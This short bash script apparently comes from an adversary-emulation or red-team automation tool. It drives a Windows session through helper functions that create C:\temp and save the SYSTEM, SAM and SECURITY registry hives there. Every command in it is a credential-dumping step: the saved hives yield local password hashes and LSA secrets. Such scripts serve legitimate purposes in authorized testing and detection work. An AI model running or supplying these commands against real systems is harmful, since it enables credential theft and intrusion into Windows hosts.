#!/bin/bash

: '
Registry: Save SYSTEM, SECURITY, and SAM hives.
'

execute_command "mkdir C:\temp"
create_new_line
sleep 1

execute_command "reg save hklm\system C:\temp\system.save"
create_new_line
sleep 3

execute_command "reg save hklm\sam C:\temp\sam.save"
create_new_line
sleep 3

execute_command "reg save hklm\security C:\temp\security.save"
create_new_line
sleep 3
